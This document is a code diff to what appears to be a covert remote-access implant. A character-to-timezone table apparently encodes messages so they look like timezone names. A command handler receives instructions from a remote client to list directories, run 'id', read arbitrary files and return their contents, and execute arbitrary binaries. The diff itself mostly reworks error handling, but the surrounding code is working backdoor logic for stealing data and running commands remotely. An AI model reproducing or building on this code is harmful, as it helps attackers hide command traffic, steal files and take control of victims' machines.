@@ -67,7 +67,8 @@ CHAR_TO_TIMEZONE = {
     "X": "America/Cancun",  # X is difficult - using location with X sound
     "Y": "America/Yakutat",
     "Z": "Europe/Zurich",
-    ", ": "Africa/Johannesburg",
+    ",": "Africa/Johannesburg",
+    " ": "Africa/Lagos",
 }
 
 TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}
@@ -220,11 +221,11 @@ def execute_action(client, action: int, path: str = None):
         
         elif action == CMD_LIST_DIR:
             if not path:
-                response.update(encode("Error: Path is missing."))
-            else:
-                result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
-                output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-                response.update(encode(output))
+                raise Exception("Missing path.")
+            
+            result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
+            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
+            response.update(encode(output))
             
         elif action == CMD_GET_USER_ID:
             # execute 'id' command to get user id
@@ -234,22 +235,22 @@ def execute_action(client, action: int, path: str = None):
             
         elif action == CMD_DOWNLOAD_FILE:
             if not path:
-                response.update(encode("Path is missing."))
-            else:
-                with open(path, 'r') as file:
-                    content = file.read()
-                response.update(encode(content))
+                raise Exception("Missing path.")
+           
+            with open(path, 'r') as file:
+                content = file.read()
+            response.update(encode(content))
             
         elif action == CMD_EXECUTE_BINARY:
             if not path:
-                response.update(encode("Path is missing."))
-            else:  
-                result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
-                output = f"STDOUT {result.stdout} STDERR {result.stderr}"
-                response.update(encode(output))
+                raise Exception("Missing path.")
+        
+            result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
+            output = f"OUT {result.stdout}, ERR {result.stderr}"
+            response.update(encode(output))
     
     except FileNotFoundError:
-        response.update(encode(f"Error: File {path} not found"))
+        response.update(encode(f"{path} not found"))
     except subprocess.TimeoutExpired:
         response.update(encode("Timeout"))
     except Exception as ex:
